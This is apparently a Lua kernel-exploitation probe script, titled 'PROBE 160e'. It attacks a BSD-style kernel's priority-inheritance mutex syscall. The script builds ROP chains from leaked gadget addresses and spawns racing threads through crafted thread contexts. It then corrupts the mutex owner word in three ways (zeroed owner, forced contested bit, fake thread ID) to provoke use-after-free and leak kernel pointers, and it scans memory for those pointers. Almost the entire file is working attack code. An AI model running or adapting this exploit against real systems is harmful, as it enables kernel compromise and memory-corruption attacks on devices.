-- CRASH_CLASS: HIGH
-- PROBE 160e: PI mutex word corruption — main corrupts m_owner while children race
--
-- Attack: children do LOCK(5)→UNLOCK(6) on PI mutex. Main thread writes
-- m_owner=0 (fake unlock) in tight loop. If kernel sees m_owner=0 while its
-- internal umtx_pi still tracks an owner, it may:
-- 1. Double-allocate umtx_pi (UAF)
-- 2. Skip priority unlending (stale PI chain)
-- 3. Corrupt wait queue (spurious wakeup to non-waiter)
-- Then check mutex neighborhood for leaked kernel pointers.

print("=== PROBE 160e: PI CORRUPT ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(num)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=num
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function hl(v)
    if type(v)=="table" and v.h then return v.h,v.l end
    return 0,N(v)
end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local umtx=mk(454)
local tc=mk(430)
local tk=mk(433)
local mm=mk(477)
local c624=mk(624)
local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local SA=syscall.syscall_address
if not SA then print("NO SA") return end

local inf=memory.alloc(0x200)
wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0
local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
print("gadgets OK")

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _CX=0x060;local _R8=0x068;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local STSZ=0x10000  -- 64KB

local function bstk(mx)
    local ok_s,stk=pcall(function()
        return mm(uint64(0),uint64(STSZ),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok_s then return nil,0 end
    local np=math.floor((STSZ-96)/80)
    local off=0
    for i=1,np do
        wq(stk+off,PRSI);off=off+8
        wq(stk+off,uint64(6));off=off+8
        wq(stk+off,PRAX);off=off+8
        wq(stk+off,uint64(454));off=off+8
        wq(stk+off,SA);off=off+8
        wq(stk+off,PRSI);off=off+8
        wq(stk+off,uint64(5));off=off+8
        wq(stk+off,PRAX);off=off+8
        wq(stk+off,uint64(454));off=off+8
        wq(stk+off,SA);off=off+8
    end
    wq(stk+off,PRSI);off=off+8
    wq(stk+off,uint64(6));off=off+8
    wq(stk+off,PRAX);off=off+8
    wq(stk+off,uint64(454));off=off+8
    wq(stk+off,SA);off=off+8
    local ts=memory.alloc(16);wq(ts,uint64(999));wq(ts+8,uint64(0))
    wq(stk+off,PRDI);off=off+8
    wq(stk+off,uint64(N(ts)));off=off+8
    wq(stk+off,PRSI);off=off+8
    wq(stk+off,uint64(0));off=off+8
    wq(stk+off,PRAX);off=off+8
    wq(stk+off,uint64(240));off=off+8
    wq(stk+off,SA);off=off+8
    return stk,np
end

local function spwn(stk,mx,op)
    local ctx=memory.alloc(0x200);z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480));wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43));wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA);wq(ctx+_SP,uint64(N(stk)))
    wq(ctx+_AX,uint64(454))
    wq(ctx+_DI,uint64(N(mx)))
    wq(ctx+_SI,uint64(op))
    wq(ctx+_DX,uint64(0));wq(ctx+_CX,uint64(0));wq(ctx+_R8,uint64(0))
    local tb=memory.alloc(8);wq(tb,uint64(0))
    local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return ok_t,rv_t,rq(tb)
end

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end

local function nsl(ms)
    local ts=memory.alloc(16)
    wq(ts,uint64(math.floor(ms/1000)))
    wq(ts+8,uint64((ms%1000)*1000000))
    pcall(function() mk(240)(uint64(ts),uint64(0)) end)
end

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- ============================================================
print("")
print("--- SECTION A: ZERO OWNER CORRUPTION ---")
local mtx=memory.alloc(0x80);z(mtx,0x80);wd(mtx+4,4) -- PI

local vm0=vmc()
print("vm0="..vm0)

local s1,np=bstk(mtx)
if not s1 then print("s1 FAIL") return end
local s2=bstk(mtx)
if not s2 then print("s2 FAIL") return end
print(np.." pairs each")

local ok1,rv1,tid1=spwn(s1,mtx,5)
print("c1 rv="..N(rv1).." tid="..q(tid1))
nsl(2)
local ok2,rv2,tid2=spwn(s2,mtx,5)
print("c2 rv="..N(rv2).." tid="..q(tid2))
nsl(5)
print("alive="..tostring(alive(tid1)).."/"..tostring(alive(tid2)))

-- Tight loop: write m_owner=0 while children race
print("corrupting...")
local wcnt=0
for i=1,5000 do
    wd(mtx,0)  -- force m_owner=0 (fake unlock)
    wcnt=wcnt+1
end
print("wrote "..wcnt.."x zero")

nsl(50) -- let children settle

local vm1=vmc()
print("vm A: "..vm0.."->"..vm1.." d="..(vm1-vm0))
print("alive="..tostring(alive(tid1)).."/"..tostring(alive(tid2)))

-- Scan for kernel pointers
local kpA=0
for o=0,0x78,8 do
    local v=rq(mtx+o)
    if v then
        local vh=hl(v)
        if vh<0 then vh=vh+0x100000000 end
        if vh>=0xFFFF8000 and vh~=0xFFFFFFFF then
            kpA=kpA+1
            print(string.format("  KPTR +0x%02X: %s",o,q(v)))
        end
    end
end
print("kptr="..kpA)
print("owner=0x"..string.format("%X",rd(mtx) or 0).." flags=0x"..string.format("%X",rd(mtx+4) or 0))

-- ============================================================
print("")
print("--- SECTION B: CONTESTED BIT CORRUPTION ---")
local mtx2=memory.alloc(0x80);z(mtx2,0x80);wd(mtx2+4,4)

local s3,np3=bstk(mtx2)
if not s3 then print("s3 FAIL") return end
local s4=bstk(mtx2)
if not s4 then print("s4 FAIL") return end

local ok3,_,tid3=spwn(s3,mtx2,5)
print("c3 tid="..q(tid3))
nsl(2)
local ok4,_,tid4=spwn(s4,mtx2,5)
print("c4 tid="..q(tid4))
nsl(5)

-- Tight loop: set CONTESTED bit (0x80000000) while children race
-- This tells kernel "there are waiters" even when there aren't
print("contested bit flooding...")
local t3v=N(tid3)
for i=1,5000 do
    local own=rd(mtx2) or 0
    if own~=0 and own<0x80000000 then
        wd(mtx2, own + 0x80000000)  -- set contested bit on current owner
    end
end
print("done")

nsl(50)
local vm2=vmc()
print("vm B: d="..(vm2-vm1))
print("alive="..tostring(alive(tid3)).."/"..tostring(alive(tid4)))

local kpB=0
for o=0,0x78,8 do
    local v=rq(mtx2+o)
    if v then
        local vh=hl(v)
        if vh<0 then vh=vh+0x100000000 end
        if vh>=0xFFFF8000 and vh~=0xFFFFFFFF then
            kpB=kpB+1
            print(string.format("  KPTR +0x%02X: %s",o,q(v)))
        end
    end
end
print("kptr="..kpB)
print("owner=0x"..string.format("%X",rd(mtx2) or 0).." flags=0x"..string.format("%X",rd(mtx2+4) or 0))

-- ============================================================
print("")
print("--- SECTION C: FAKE TID INJECTION ---")
local mtx3=memory.alloc(0x80);z(mtx3,0x80);wd(mtx3+4,4)

local s5,np5=bstk(mtx3)
if not s5 then print("s5 FAIL") return end
local s6=bstk(mtx3)
if not s6 then print("s6 FAIL") return end

local ok5,_,tid5=spwn(s5,mtx3,5)
print("c5 tid="..q(tid5))
nsl(2)
local ok6,_,tid6=spwn(s6,mtx3,5)
print("c6 tid="..q(tid6))
nsl(5)

-- Tight loop: write fake TID to m_owner
-- Kernel tries to lend priority to non-existent thread
print("fake TID injection...")
for i=1,5000 do
    wd(mtx3, 0x7FFFFFFF)  -- max positive TID
end
print("done")

nsl(50)
local vm3=vmc()
print("vm C: d="..(vm3-vm2))
print("alive="..tostring(alive(tid5)).."/"..tostring(alive(tid6)))

local kpC=0
for o=0,0x78,8 do
    local v=rq(mtx3+o)
    if v then
        local vh=hl(v)
        if vh<0 then vh=vh+0x100000000 end
        if vh>=0xFFFF8000 and vh~=0xFFFFFFFF then
            kpC=kpC+1
            print(string.format("  KPTR +0x%02X: %s",o,q(v)))
        end
    end
end
print("kptr="..kpC)
print("owner=0x"..string.format("%X",rd(mtx3) or 0))

print("")
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 160e COMPLETE ===")
